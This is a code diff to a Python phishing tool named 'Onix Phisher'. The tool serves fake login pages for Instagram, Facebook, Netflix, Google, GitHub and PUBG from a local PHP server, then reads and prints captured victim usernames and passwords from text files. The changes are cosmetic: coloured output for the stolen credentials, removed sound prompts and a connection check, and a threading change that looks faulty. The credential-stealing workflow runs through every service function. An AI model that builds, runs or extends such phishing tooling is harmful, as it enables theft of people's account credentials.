@@ -5,6 +5,7 @@ import os
 import linecache
 import random
 import requests
+import threading
 from time import sleep
 try:
     from colorama import Fore , init; init()
@@ -23,19 +24,6 @@ except ImportError or ModuleNotFoundError:
 
 #Change Title====================================================================================================
 os.system("title Onix Phisher")
-
-#Check Connection====================================================================================================
-try:
-    connection = requests.get("https://www.nasa.gov")
-    connection1 = requests.get("https://www.kali.org")
-
-    if connection.status_code == 200 or connection1.status_code == 200:
-        pass
-    
-    else:
-        exit(Fore.RED + "You dont have internet connection please check your connection and come back soon !!" + Fore.RESET)
-except Exception:
-    exit(Fore.RED + "You dont have internet connection please check your connection and come back !!" + Fore.RESET)
 
 #build localhost====================================================================================================
 def php_server():
@@ -111,13 +99,6 @@ print(f"""
 
 try:
     ask = input(Fore.MAGENTA + "which option you want: ".title() + Fore.RESET)
-    if ask != "0":
-        voices = ("good_idea.mp3" , "im_with_you.mp3" , "nice_choose.mp3" , "you_own.mp3")
-        voice_path = os.getcwd()
-        os.chdir(fr"{voice_path}\Voice")
-        playsound(random.choice(voices))
-        sleep(0.2)
-        os.chdir("..")
 except KeyboardInterrupt:
     exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
@@ -163,11 +144,14 @@ def instagram():
                 
                 #play sound
                 os.chdir(r"..\Voice")
-                playsound("T_connected.mp3")
+                sound = playsound("T_connected.mp3")
                 sleep(0.5)
                 os.chdir(fr"{path}\instagram")
                 sleep(0.5)
 
+                t = threading.Thread(target=sound)
+                t.start()
+                
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
@@ -198,7 +182,7 @@ def instagram():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print("\n\nThe username is:" , user.read())
+                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -215,7 +199,7 @@ def instagram():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print("The password is:" , pas.read())
+                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -274,11 +258,13 @@ def facebook():
 
                 #play sound
                 os.chdir(r"..\Voice")
-                playsound("T_connected.mp3")
+                sound = playsound("T_connected.mp3")
                 sleep(0.5)
                 os.chdir(fr"{path}\facebook")
                 sleep(0.5)
 
+                t = threading.Thread(target=sound)
+                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -309,7 +295,7 @@ def facebook():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print("\n\nThe user name is:" , user.read())
+                print(f"\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -326,7 +312,7 @@ def facebook():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print("The password is:" , pas.read())
+                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -386,11 +372,13 @@ def netflix():
 
                 #play sound
                 os.chdir(r"..\Voice")
-                playsound("T_connected.mp3")
+                sound = playsound("T_connected.mp3")
                 sleep(0.5)
                 os.chdir(fr"{path}\Netflix")
                 sleep(0.5)
 
+                t = threading.Thread(target=sound)
+                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -421,7 +409,7 @@ def netflix():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print("\n\nThe user name is:" , user.read())
+                print(f"\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -438,7 +426,7 @@ def netflix():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(9)
-                print("The password is:" , pas.read())
+                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -498,11 +486,13 @@ def Google():
 
                 #play sound
                 os.chdir(r"..\Voice")
-                playsound("T_connected.mp3")
+                sound = playsound("T_connected.mp3")
                 sleep(0.5)
                 os.chdir(fr"{path}\Google")
                 sleep(0.5)
 
+                t = threading.Thread(target=sound)
+                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -535,7 +525,7 @@ def Google():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print("\n\nThe user name is:" , user.read())
+                print(f"\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -552,7 +542,7 @@ def Google():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(9)
-                print("The password is:" , pas.read())
+                print(f"{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -612,11 +602,13 @@ def Github():
 
                 #play sound
                 os.chdir(r"..\Voice")
-                playsound("T_connected.mp3")
+                sound = playsound("T_connected.mp3")
                 sleep(0.5)
                 os.chdir(fr"{path}\Github")
                 sleep(0.5)
 
+                t = threading.Thread(target=sound)
+                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -649,7 +641,7 @@ def Github():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print("\n\nThe username is:" , user.read())
+                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -666,7 +658,7 @@ def Github():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print("The password is:" , pas.read())
+                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -725,11 +717,13 @@ def Pubg():
 
                 #play sound
                 os.chdir(r"..\Voice")
-                playsound("T_connected.mp3")
+                sound = playsound("T_connected.mp3")
                 sleep(0.5)
                 os.chdir(fr"{path}\Pubg")
                 sleep(0.5)
 
+                t = threading.Thread(target=sound)
+                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -763,7 +757,7 @@ def Pubg():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print("\n\nThe username is:" , user.read())
+                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -780,7 +774,7 @@ def Pubg():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print("The password is:" , pas.read())
+                print(f"{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
